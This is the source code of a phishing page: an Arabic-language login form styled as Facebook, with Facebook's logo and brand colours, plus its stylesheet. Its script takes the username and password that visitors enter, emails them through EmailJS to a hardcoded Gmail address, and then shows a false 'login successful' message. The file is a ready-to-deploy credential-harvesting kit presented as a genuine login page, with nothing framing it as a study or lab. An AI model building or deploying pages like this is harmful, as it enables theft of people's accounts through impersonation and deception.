<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
</head>
<body>

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" class="logo">
        <h2>تسجيل الدخول</h2>
        <input type="text" id="username" placeholder="البريد الإلكتروني" required>
        <input type="password" id="password" placeholder="كلمة المرور" required>
        <button onclick="login()">تسجيل الدخول</button>
        <p id="message"></p>
    </div>

    <script>
        // Initialize EmailJS with your public key
        (function() {
            emailjs.init("YOUR_USER_ID"); // استبدل YOUR_USER_ID بمعرف المستخدم الخاص بك
        })();

        function login() {
            let username = document.getElementById("username").value;
            let password = document.getElementById("password").value;

            if (username !== "" && password !== "") {
                // إرسال البيانات إلى بريدك باستخدام EmailJS
                emailjs.send("service_xxxxx", "template_xxxxx", {
                    to_email: "gaithg611@gmail.com",
                    username: username,
                    password: password
                }).then(() => {
                    document.getElementById("message").textContent = "تم تسجيل الدخول بنجاح!";
                }).catch((error) => {
                    document.getElementById("message").textContent = "حدث خطأ! حاول مرة أخرى.";
                });
            } else {
                document.getElementById("message").textContent = "يرجى إدخال البريد وكلمة المرور!";
            }
        }
    </script>

</body>
</html>/* تصميم عام */
body {
    font-family: Arial, sans-serif;
    text-align: center;
    background-color: #f4f4f4;
    margin: 0;
    padding: 0;
}

/* صفحة تسجيل الدخول */
.login-container {
    width: 90%;
    max-width: 350px;
    background: white;
    padding: 20px;
    border-radius: 10px;
    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
    margin: 100px auto;
}

.logo {
    width: 100px;
    margin-bottom: 20px;
}

input {
    width: 90%;
    padding: 10px;
    margin: 10px 0;
    border: 1px solid #ccc;
    border-radius: 5px;
}

button {
    padding: 10px 15px;
    background-color: #1877f2;
    color: white;
    border: none;
    border-radius: 5px;
    cursor: pointer;
}

button:hover {
    background-color: #145dbf;
}

#message {
    margin-top: 10px;
    color: red;
}
